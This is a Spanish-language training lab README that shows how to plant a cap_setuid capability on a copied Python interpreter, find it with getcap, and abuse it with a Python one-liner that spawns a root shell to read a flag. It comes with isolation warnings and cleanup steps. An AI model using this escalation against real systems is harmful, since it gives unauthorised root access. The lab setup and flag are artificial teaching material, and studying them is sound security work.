# Laboratorio: capability sensible

[Inicio](../../../README.md) | [Privilege Escalation](../../README.md) | [Capítulo 05: Linux capabilities](../README.md)

> [!CAUTION]
> `setup.sh` asigna `cap_setuid+ep` a un intérprete de Python, lo que equivale a conceder `root`. Ejecuta el laboratorio solo en una VM Ubuntu aislada con instantánea previa y no lo expongas a Internet.

## Alcance

Preparar un binario con la capacidad `cap_setuid` mal asignada, enumerarla desde la cuenta sin privilegios `student` y abusar de ella para cambiar el UID a 0, lanzar un shell de `root` y leer un archivo protegido. El laboratorio cubre exclusivamente el modelo de capabilities; no introduce SUID, `sudo` ni tareas programadas.

## Requisitos

- VM Ubuntu Server 22.04 LTS o superior, en red host-only.
- Cuenta `root` accesible mediante `sudo`.
- Instantánea limpia creada antes de ejecutar `setup.sh`.
- Paquetes base: `getcap` / `setcap` (aportados por `libcap2-bin`, que el script instala si falta) y `python3`.

## Preparación

Desde esta carpeta, ejecuta el script de provisión con privilegios administrativos:

```bash
sudo bash setup.sh
```

El script es idempotente: crea el usuario `student` si no existe, instala `libcap2-bin` cuando falta, copia el intérprete real de Python a `/usr/local/bin/pycap` con propiedad `root:root` y permisos `755`, aplica `cap_setuid+ep` y genera `/root/flag.txt` con permisos `0600`. Al final imprime un resumen con la configuración aplicada.

Comprueba que la capability quedó asignada:

```bash
getcap /usr/local/bin/pycap
```

Resultado esperado:

```text
/usr/local/bin/pycap = cap_setuid+ep
```

Inicia sesión como el usuario sin privilegios antes de continuar:

```bash
su - student
```

## 1. Enumerar capabilities del sistema

Barre el sistema de archivos en busca de binarios con capacidades asignadas. La redirección de `2>/dev/null` descarta los errores de permiso que `getcap` produce al recorrer directorios ajenos:

```bash
getcap -r / 2>/dev/null
```

Entre la salida debe aparecer el binario del laboratorio:

```text
/usr/local/bin/pycap = cap_setuid+ep
```

Localiza la línea correspondiente a `pycap` para confirmar que la capacidad sensible está presente antes de abusar de ella:

```bash
getcap -r / 2>/dev/null | grep pycap
```

## 2. Confirmar el binario y su naturaleza

Inspecciona el archivo que contiene la capacidad. El binario es propiedad de `root` pero no tiene el bit SUID, así que `ls -l` no revela ningún privilegio y solo `getcap` lo delata:

```bash
ls -l /usr/local/bin/pycap
getcap /usr/local/bin/pycap
```

Resultado esperado:

```text
-rwxr-xr-x 1 root root ... /usr/local/bin/pycap
/usr/local/bin/pycap = cap_setuid+ep
```

## 3. Abusar de `cap_setuid`

`CAP_SETUID` permite cambiar el UID del propio proceso a cualquier valor, incluido `0`. Como `pycap` es un intérprete de Python, basta con pedir el UID 0 y lanzar un shell desde el mismo proceso:

```bash
/usr/local/bin/pycap -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Al aceptar el kernel el cambio de UID, el shell resultante se ejecuta como `root`. Si el proceso no tuviera la capacidad, `os.setuid(0)` fallaría con `PermissionError`.

## 4. Confirmar el UID y leer el flag

Dentro del shell obtenido, verifica la identidad efectiva:

```bash
id
```

Resultado esperado:

```text
uid=0(root) gid=0(root) groups=0(root)
```

A continuación lee el archivo que la cuenta `student` no podía abrir:

```bash
cat /root/flag.txt
```

Resultado esperado:

```text
PURPESEC{cap_setuid_lab_05}
```

## Resultados esperados

- `getcap -r / 2>/dev/null` muestra `/usr/local/bin/pycap = cap_setuid+ep`.
- `ls -l` no muestra bit SUID sobre `/usr/local/bin/pycap`; el privilegio proviene solo de la capability.
- La ejecución de `pycap` con `os.setuid(0)` abre un shell sin solicitar contraseña.
- `id` confirma `uid=0(root)`.
- `cat /root/flag.txt` muestra `PURPESEC{cap_setuid_lab_05}`.

## Validación

La práctica se considera correcta cuando se observan ambas señales técnicas de éxito:

```text
[ ] La enumeración revela cap_setuid+ep sobre /usr/local/bin/pycap
[ ] El shell obtenido reporta uid=0(root)
[ ] El contenido de /root/flag.txt es PURPESEC{cap_setuid_lab_05}
```

La evidencia principal es la línea `uid=0(root)` devuelta por `id` y el contenido exacto del flag. Si `getcap` no muestra la capacidad, la preparación no se completó; si `os.setuid(0)` falla, el binario carece de la capacidad efectiva.

## Limpieza

Retira la capacidad y elimina los artefactos creados por el laboratorio:

```bash
sudo setcap -r /usr/local/bin/pycap
sudo rm -f /usr/local/bin/pycap /root/flag.txt
```

De forma alternativa, revierte la instantánea de la VM para restaurar el estado limpio anterior a la preparación.

---

[Volver al capítulo 05](../README.md) | [Volver al índice de la ruta](../../README.md) | [Inicio](../../../README.md)
